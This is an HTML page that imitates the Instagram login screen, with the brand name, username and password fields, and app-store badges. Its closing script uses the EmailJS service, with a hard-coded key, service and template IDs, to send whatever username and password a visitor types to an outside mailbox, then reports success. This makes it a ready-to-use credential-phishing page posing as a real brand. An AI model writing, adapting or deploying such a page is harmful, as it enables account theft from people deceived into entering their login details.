<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{
  font-family:Arial,Helvetica,sans-serif;
  background:black;
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  overflow:hidden;
  position:relative;
}
/* 登录容器 */
.container{
  display:flex;
  justify-content:center;
  align-items:center;
  width:100%;
  height:100%;
}
/* 登录卡片 */
.login-card{
  background:rgba(17,17,17,0.85);
  border-radius:25px;
  padding:45px 35px;
  width:350px;
  max-width:90%;
  position:relative;
  border:2px solid rgba(255,255,255,0.1);
}
.logo{
  font-family:'Grand Hotel',cursive; /* 近似 Instagram 官方字体 */
  font-size:50px; /* 放大一点 */
  margin-bottom:25px;
  display:block;
  color:white;
  text-align:center;
}
/* 输入框 */
input{
  width:100%;
  padding:12px;
  margin:8px 0;
  background:#222;
  border:none;
  border-radius:8px;
  color:white;
}
input::placeholder{color:#aaa;}
/* 登录按钮 */
button{
  width:100%;
  padding:12px;
  margin-top:12px;
  background:#0095f6;
  border:none;
  border-radius:10px;
  color:white;
  font-weight:bold;
  cursor:pointer;
  transition:0.2s;
}
button:hover{background:#1877f2;}
/* OR 分隔线 */
.divider{
  margin:18px 0;
  color:#888;
  font-size:14px;
  text-align:center;
}
/* Signup */
.signup{
  font-size:14px;
  color:#aaa;
  margin-top:10px;
  text-align:center;
}
.signup a{
  color:#0095f6;
  text-decoration:none;
}
/* App 下载区 */
.apps{
  margin-top:15px;
  display:flex;
  justify-content:center;
  gap:10px;
  flex-wrap:wrap;
}
.apps img{
  height:40px;
  border-radius:5px;
  cursor:pointer;
  transition:0.2s;
}
.apps img:hover{transform:scale(1.05);}
</style>
</head>
<body>

<div class="container">
<div class="login-card">
<div class="logo">Instagram</div>

<form id="loginForm">
  <input type="text" name="username" placeholder="Mobile number, username or email" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Log in</button>
</form>

<div class="divider">OR</div>

<div class="signup">
  Don't have an account? <a href="#">Sign up</a>
</div>

<div class="apps">
  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
  <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg">
</div>
</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
// EmailJS 初始化
(function(){emailjs.init("0lXSpk6E_Y9ySmxZo");})();
document.getElementById("loginForm").addEventListener("submit",function(e){
  e.preventDefault();
  emailjs.sendForm("service_k47wv9h","template_4ief8e9",this)
  .then(function(){alert("Form submitted successfully!");},function(error){alert("Send error");});
});
</script>
</body>
</html>
